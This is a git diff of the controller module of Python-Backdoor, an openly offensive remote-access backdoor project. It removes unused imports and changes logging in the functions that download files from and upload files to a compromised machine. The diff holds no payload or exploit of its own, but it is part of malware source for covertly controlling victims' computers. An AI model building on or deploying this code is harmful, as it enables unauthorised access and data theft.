@@ -5,12 +5,8 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import ast
-import base64
-import codecs
 import logging
 import re
-import socket
 import time
 
 from src import errors, helper
@@ -201,7 +197,7 @@ class Control:
         if rsp["key"] == SERVER_FILE_RECV:
             buffer = rsp["value"]["buffer"]
 
-            self.logger.info(f"File size: {buffer} bytes")
+            self.logger.info(f"File size: {rsp['value']['value']} bytes")
 
             file_data = self.socket.recvall(buffer)
 
@@ -212,7 +208,7 @@ class Control:
                 self.logger.error(f"Error writing to file {e}")
                 return
 
-            self.logger.info(f"Total bytes received: {os.path.getsize(out_file)} bytes")
+            self.logger.info(f"Total bytes received: {len(file_data)} bytes")
 
         elif rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
@@ -230,12 +226,14 @@ class Control:
             return
 
         with open(file, "rb") as _file:
-            self.socket.sendall_json(CLIENT_UPLOAD_FILE, _file.read(), sub_value=out_file, is_bytes=True)
+            data = _file.read()
+            self.logger.info(f"File size: {len(data)}")
+            self.socket.sendall_json(CLIENT_UPLOAD_FILE, data, sub_value=out_file, is_bytes=True)
 
         rsp = self.socket.recv_json()
 
         if rsp["key"] == SUCCESS:
-            self.logger.info("OK.")
+            self.logger.info(rsp["value"])
         elif rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
 
